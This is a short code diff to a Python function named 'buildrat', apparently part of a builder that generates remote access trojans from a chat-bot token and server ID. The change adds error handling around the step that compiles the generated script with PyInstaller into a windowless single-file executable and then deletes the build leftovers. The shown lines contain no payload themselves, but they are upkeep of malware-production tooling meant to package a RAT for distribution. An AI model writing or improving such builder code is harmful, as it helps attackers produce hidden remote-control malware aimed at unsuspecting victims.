@@ -49,11 +49,17 @@ def buildrat(token, serverid, execheck):
     if exe == True:
         os.chdir("build")
         print("converting file to exe... this may take a minute")
-        os.system(f"pyinstaller --noconsole --onefile {filename}.py > NUL 2>&1")
-        os.system(f"move dist\\{filename}.exe .")
-        shutil.rmtree("dist")
-        shutil.rmtree("build")
-        os.remove(f"{filename}.spec")
+        try:
+            os.system(f"pyinstaller --noconsole --onefile {filename}.py > NUL 2>&1")
+        except Exception as e:
+            print(f"error occured when converting file to exe, please try again, if that does not work, run setup.bat")
+        try:
+            os.system(f"move dist\\{filename}.exe .")
+            shutil.rmtree("dist")
+            shutil.rmtree("build")
+            os.remove(f"{filename}.spec")
+        except Exception as e:
+            print(f"error when cleaning up files, please run setup.bat")
         os.system("cls")
         os.system("echo exe conversion done")
         os.chdir("..")
